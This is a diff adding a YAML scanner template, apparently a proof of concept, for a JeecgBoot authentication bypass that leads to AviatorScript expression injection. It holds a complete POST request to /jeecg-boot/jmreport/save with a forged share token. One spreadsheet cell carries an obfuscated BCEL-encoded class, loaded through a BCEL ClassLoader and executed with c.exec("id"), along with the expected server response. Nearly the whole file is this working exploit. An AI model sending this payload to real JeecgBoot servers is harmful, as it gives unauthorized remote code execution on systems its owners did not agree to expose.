@@ -1,0 +1,25 @@
+id:
+info:
+  name: JeecgBoot 权限绕过致AviatorScript表达式注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /jeecg-boot/jmreport/save?previousPage=1&jmLink=YWFhfHxiYm&shareToken=1&token=1
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 YisouSpider/5.0 Safari/537.3
+    Accept: application/json, text/plain, */*
+    JmReport-Share-Token: 1
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json;charset=UTF-8
+  data: |
+    {"designerObj":{"id":"123456","name":"test","type":"datainfo"},"name":"sheet1","freeze":"A1","freezeLineColor":"rgb(185, 185, 185)","styles":[],"displayConfig":{},"printConfig":{"paper":"A4","width":210,"height":297,"definition":1,"isBackend":false,"marginX":10,"marginY":10,"layout":"portrait","printCallBackUrl":""},"merges":[],"rows":{"0":{"cells":{"0":{"text":"=(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dP$cbN$c2$40$U$3d$D$a5$c5Z$FD$7c$r$s$ea$c6$c2$c2n$dca$dc$YLL$88$Y$n$eeK$bd$nC$da$vi$H$82$7f$a5$h5$$$fc$A$3f$cax$db$u$Q$t$99$fb89$e7$be$be$be$3f$3e$B$9c$e3$c0F$JU$h5le$a6na$dbBC$c0$bc$90J$eaK$81$a2$db$7c$Q0$ae$e2G$S$a8t$a5$a2$dbi4$a4d$e0$PCF$M$9aS$mp$eav$c7$fe$cc$f7B_$8d$bc$beN$a4$g$b5$9b$x$d0$5d$S$H$94$a6m$B$bb3$Ph$a2e$acR$L$3b$9c$f7$e3i$S$d0$b5$cc$aam$M$u$d5$9d$99$M$cf2$a9$D$T$96$85$5d$H$7b$d8w$60c$5d$e0$q$88$p$8f$e6$7e4$J$c9$8b$u$8a$93$t$c9$b1$af$b4$f7$a7$V$a8$$$h$f7$86c$K$b4$40$3d$87d$ec$dd$f4$W$D$I$d4$96$c4$fb$a9$d22$e2$Z$ec$R$e9E$d2pW$b7$f8$85$db8$86$c1g$cb$5e$B$o$9b$92m$99$b3C$f6$82$7d$a9$f5$G$f1$c2$81$c0$g$5b3$H$N$8ey$H$96d$d4$a3$5c$K$94$dfQh$bd$a2$f8$fc$8fm$c2$c95$7c$U$fe$9by$ab$ca$P$o$ZcR$b7$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()))+(c.exec(\"id\"));"}}},"len":100},"cols":{"len":50},"validations":[],"autofilter":{},"dbexps":[],"dicts":[],"loopBlockList":[],"zonedEditionList":[],"fixedPrintHeadRows":[],"fixedPrintTailRows":[],"rpbar":{"show":true,"pageSize":"","btnList":[]},"hiddenCells":[],"hidden":{"rows":[],"cols":[]},"background":false,"area":false,"dataRectWidth":0,"excel_config_id":"123456","pyGroupEngine":false,"querySetting":{"izOpenQueryBar":false,"izDefaultQuery":true}}
+response1:
+  headers:
+  body: 123456
+  code: 200
+requests2:
+response2:
